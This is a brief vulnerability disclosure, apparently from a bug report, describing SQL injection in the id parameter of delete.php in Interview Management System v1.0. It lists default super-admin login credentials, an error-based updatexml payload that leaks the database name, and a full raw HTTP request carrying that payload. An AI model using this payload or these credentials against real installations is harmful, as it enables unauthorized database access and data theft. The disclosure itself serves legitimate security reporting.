# Interview Management System v1.0 by janobe has SQL injection

BUG_Author: Fright-Moch

Login account: janobe@janobe.com/janobe (Super Admin account)

vendors: https://www.sourcecodester.com/php/14585/interview-management-system-phpmysqli-full-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /interview/delete.php?action=questiondelete&id=

Vulnerability location: /interview/delete.php?action=questiondelete&id=, id

dbname =sourcecodester_interviewdb

[+] Payload: /interview/delete.php?action=questiondelete&id=(updatexml(1,concat(0x7e,(select%20database()),0x7e),0)) // Leak place ---> id

```sql
GET /interview/delete.php?action=questiondelete&id=(updatexml(1,concat(0x7e,(select%20database()),0x7e),0)) HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=fjhrjdpuej6edqv5haoadpj3lc
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/183243861-4eca76f5-218e-42e6-aac0-dcc9b871a085.png)

